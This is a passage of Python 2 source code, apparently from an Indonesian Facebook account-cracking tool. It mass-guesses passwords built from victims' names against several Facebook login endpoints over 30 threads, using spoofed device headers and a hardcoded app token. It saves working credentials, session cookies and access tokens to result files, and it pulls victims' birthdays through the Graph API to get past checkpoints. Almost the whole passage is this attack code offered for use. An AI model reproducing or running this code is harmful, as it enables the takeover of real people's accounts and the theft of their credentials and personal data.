                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _jeeck_X_mnbf_ = akun.split('<=>')[0]
                                        log.submit(self.b_api, _jeeck_X_mnbf_, _jeeck_X_nano_sayang_mamah__)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif _jeeck_X_ in ('2', '02'):
                            
                            print '\n%s [%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _jeeck_X_mnbf_ = akun.split('<=>')[0]
                                        log.submit(self.basic, _jeeck_X_mnbf_, _jeeck_X_nano_sayang_mamah__)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif _jeeck_X_ in ('3', '03'):
                            
                            print '\n%s [%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _jeeck_X_mnbf_ = akun.split('<=>')[0]
                                        log.submit(self.free, _jeeck_X_mnbf_, _jeeck_X_nano_sayang_mamah__)
                                    except: pass
                            os.remove(self.apk);exit()
                        elif _jeeck_X_ in ('4', '04'):
#                            
                        
                            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        _jeeck_X_mnbf_ = akun.split('<=>')[0]
                                        log.submit(self.mobil, _jeeck_X_mnbf_, _jeeck_X_nano_sayang_mamah__)
                                    except: pass
                            os.remove(self.apk);exit()
                        else:
                            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");_jeeck_X_nano_()
                    jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih sesuka hati kalian")
                    print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m B-Api [ FAST CRACK ]")
                    print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ RECOMENDED V1 ]]")
                    print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free Fb [ Selow[ RECOMENDED V2 ]]")
                    jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ LEBIH BANYAK HASIL RECOMENDED V3 ]]")
                    _jeeck_X_nano_(pwx.split(','))
                    break
        elif __jeeck__ganz__X__sad__boy__ in ('O', 'o'):
            jeeck("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih sesuka hati kalian")
            print(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m B-Api [ FAST CRACK ]")
            print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Mbasic [ Selow[ RECOMENDED V1 ]]")
            print(" \033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Free fb[ Selow[ RECOMENDED V2 ]]")
            jeeck(" \033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Mobile [ Supper Sellow [ LEBIH BANYAK HASIL RECOMENDED V3 ]]")
            self.langsung()
        else:
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()
    def langsung(self):
        suuu = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
        if suuu == '':
            jeeck(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar ");self.langsung()
        elif suuu in ('1', '01'):
 
            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('2', '02'):

            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('3', '03'):

            print '\n %s[%s+%s] akun %sOK%s tersimpan di =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.free, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif suuu in ('4', '04'):
 
            print '\n %s[%s+%s] akun %sOK%s tersimpan di£ =>%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s+%s] akun %sCP %stersimpan di => %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");self.langsung()
    def b_api(self, user, _jeeck_X_nano_):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            bapi="https://b-api.facebook.com/method/auth.login"
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	jeeck("\r \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ip terblokir hidupkan mode pesawat 2 detik")
                sys.stdout.flush()
                loop +=1
                b_api(self, user, _jeeck_X_nano_)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s%s | %s | %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s | %s | %s' % (user,pw,response.json()['access_token']))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' %s | %s | %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    _jeeck_ganteng_kagakadapacar_ = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,_jeeck_ganteng_kagakadapacar_)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s%s | %s | %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s%s | %s           ' % (K,user,pw)
                cp.append('%s | %s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
#        print('\r %s[ %s %s] %s/%s [OK-:%s]-[CP-:%s]'%(K,B,K,datetime.now(
        print('\r[ %s ] %s/%s [OK-:%s]-[CP-:%s]'%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, _jeeck_X_nano_):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,+/+;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.+?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s%s | %s | %s  ' % (H,user,pw,kuki)
                ok.append("%s | %s | %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    _jeeck_ganteng_kagakadapacar_ = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,_jeeck_ganteng_kagakadapacar_)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s%s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s%s | %s            ' % (K,user,pw)
                cp.append("%s | %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
      #  
        print('\r [ %s ] %s/%s [OK-:%s]-[CP-:%s]'%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def free(self, user, _jeeck_X_nano_):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,+/+;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://free.facebook.com/login.php")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.+?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s%s | %s | %s  ' % (H,user,pw,kuki)
                ok.append("%s | %s | %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    _jeeck_ganteng_kagakadapacar_ = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,_jeeck_ganteng_kagakadapacar_)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s%s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s%s | %s            ' % (K,user,pw)
                cp.append("%s | %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
      #  
        print('\r [ %s ] %s/%s [OK-:%s]-[CP-:%s]'%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, _jeeck_X_nano_):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,+/+;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.+?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s%s | %s | %s ' % (H,user,pw,kuki)
                ok.append("%s | %s | %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    _jeeck_ganteng_kagakadapacar_ = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,_jeeck_ganteng_kagakadapacar_)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s%s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s | %s | %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s | %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s%s | %s              ' % (K,user,pw)
                cp.append("%s | %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s | %s\n"%(user,pw))
                break
                continue
        loop += 1
       # 
        print('\r [ %s ] %s/%s [OK-:%s]-[CP-:%s]'%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

def useragent():
	print("\n \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Seting useragent")
	print(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Chek useragent")
	print(" \033[0;36m[\033[0;35m0\033[0;36m]\033[0;00m Back")
	useragent_xnxx_()
def useragent_xnxx_():
    u = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih : ")
    if u == '':
        print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar ");jeda(2);useragent_xnxx_()
    elif u in("1","01"):
    	print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketikan ,USER AGENT, untuk mengambil useragent")
    	print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketikan ,JEECK, untuk mengunakan useragent tools")
    	try:
    	    ua = raw_input(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
            if ua in(""):
            	print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar babi");jeda(2);menu()
            elif ua in("user agent"," User Agent","USER AGENT","Useragent"):
            	print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Anda akan di arahkan ke browser");jeda(2)
            	os.system("am start https://gist.github.com/pzb/b4b6f57144aea7827ae4");jeda(2);useragent()
            elif ua in("JEECK","jeeck","Jeeck"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Menggunakan useragent bawaan");jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print(" \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Sucsesfull gamti useragemt");jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s+%s] user agent anda : %s%s"%(P,B,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,B,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar ");jeda(2);useragent_xnxx_()

if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
